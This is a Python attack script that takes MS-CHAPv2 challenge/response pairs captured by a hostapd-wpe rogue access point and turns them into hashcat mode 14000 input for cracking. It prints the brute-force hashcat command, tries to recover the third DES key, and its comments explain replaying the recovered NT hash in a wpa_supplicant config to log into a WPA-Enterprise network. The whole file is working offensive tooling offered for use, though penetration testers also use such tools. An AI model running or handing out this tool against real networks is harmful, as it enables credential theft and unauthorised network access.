#!/usr/bin/env python3
import re
import ct3
import argparse
import os
import sys

'''
Script made by some AI stuff, and idea from David M. N. Bryan (Aka VideoMan). 

Enjoy!

This came about, as you can replay an NT HASH against a radius server, and wanted
a way to easily toss the hashes up on a hashcat cluster. This script creates a file with the two
hashes that need to be cracked using hashcat in mode 14000 (two 7-byte DES encrypted blocks 
with the challenge as the salt, and parity).

Once you get the hashes back you will need to combine them all to one NTLM HASH.

You can then make a wpa_suplicant.conf file that looks like: 
network={
        ssid="example"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        identity="harold"
        password="hash:e19ccf75ee54e06b06a5907af13cef42"
        ca_cert="/etc/cert/ca.pem"
        phase1="peaplabel=0"
        phase2="auth=MSCHAPV2"
}
'''

def parse_hostapd_wpe_log(file_path):
    """
    Parses the hostapd-wpe log file to extract MS-CHAPv2 credentials.
    """
    try:
        with open(file_path, "r") as file:
            content = file.read()
    except FileNotFoundError:
        raise FileNotFoundError(f"The file '{file_path}' was not found.")
    except PermissionError:
        raise PermissionError(f"Permission denied when trying to read '{file_path}'.")
    
    # Extract challenge (convert colon-separated hex to normal hex format)
    challenge_match = re.search(r"challenge:\s*([0-9a-fA-F:]+)", content)
    challenge = challenge_match.group(1).replace(":", "").strip() if challenge_match else None

    # Extract response (convert colon-separated hex to normal hex format)
    response_match = re.search(r"response:\s*([0-9a-fA-F:]+)", content)
    response = response_match.group(1).replace(":", "").strip() if response_match else None

    if not challenge or not response:
        raise ValueError("Could not find challenge or response in the log file.")
    
    if len(response) != 48:
        raise ValueError(f"Invalid MS-CHAPv2 response format. Expected 48 hex characters, got {len(response)}.")

    return challenge, response

def extract_des_blocks(response):
    """
    Extracts three 8-byte DES encrypted blocks from the 24-byte response.
    """
    enc1 = response[0:16]   # First 8-byte block (16 hex chars)
    enc2 = response[16:32]  # Second 8-byte block (16 hex chars)
    enc3 = response[32:]    # Third 8-byte block (16 hex chars)
    
    return [enc1, enc2, enc3]

def main():
    parser = argparse.ArgumentParser(
        description="Parse hostapd-wpe logs to extract MS-CHAPv2 challenge/response for use with Hashcat.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument(
        "-f", "--file", 
        dest="log_file",
        required=True,
        help="Path to the hostapd-wpe log file"
    )
    
    parser.add_argument(
        "-o", "--output",
        dest="output_file",
        default="hashcat_14000.txt",
        help="Output file for Hashcat mode 14000 format (default: hashcat_14000.txt)"
    )
    
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    parser.add_argument(
        "--skip-k3",
        action="store_true",
        help="Skip the K3 DES recovery process"
    )

    args = parser.parse_args()

    try:
        if args.verbose:
            print(f"[*] Reading log file: {args.log_file}")
        
        # Extract challenge and response
        challenge, response = parse_hostapd_wpe_log(args.log_file)

        if args.verbose:
            print(f"[+] Extracted Challenge: {challenge}")
            print(f"[+] Extracted Response: {response}")

        # Extract all three DES-encrypted blocks
        encrypted_blocks = extract_des_blocks(response)
        
        if args.verbose:
            print(f"[+] DES Block 1: {encrypted_blocks[0]}")
            print(f"[+] DES Block 2: {encrypted_blocks[1]}")
            print(f"[+] DES Block 3: {encrypted_blocks[2]}")

        # Generate Hashcat mode 14000 format for each DES-encrypted block
        hashcat_entries = [f"{challenge}:{block}" for block in encrypted_blocks[0:2]]

        if args.verbose:
            print("\n[*] Hashcat Input Format (mode 14000):")
            for entry in hashcat_entries:
                print(entry)
        
        # Save to file for Hashcat input
        with open(args.output_file, "w") as f:
            f.write("\n".join(hashcat_entries) + "\n")
        
        print(f"[+] Saved Hashcat format to: {args.output_file}")
        print(f"[*] Use with hashcat: hashcat -m 14000 -a 3 --hex-charset {args.output_file} -1 charsets/DES_full.charset ?1?1?1?1?1?1?1?1")

        # Process K3 if not skipped
        if not args.skip_k3:
            try:
                print("\n[*] Attempting to reverse the K3 DES block...")
                enc3_clear = ct3.recover_key_from_ct3(encrypted_blocks[2], challenge)
                print(f"[+] Successfully recovered K3: {enc3_clear}")
            except Exception as e:
                print(f"[!] Failed to recover K3: {str(e)}")
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
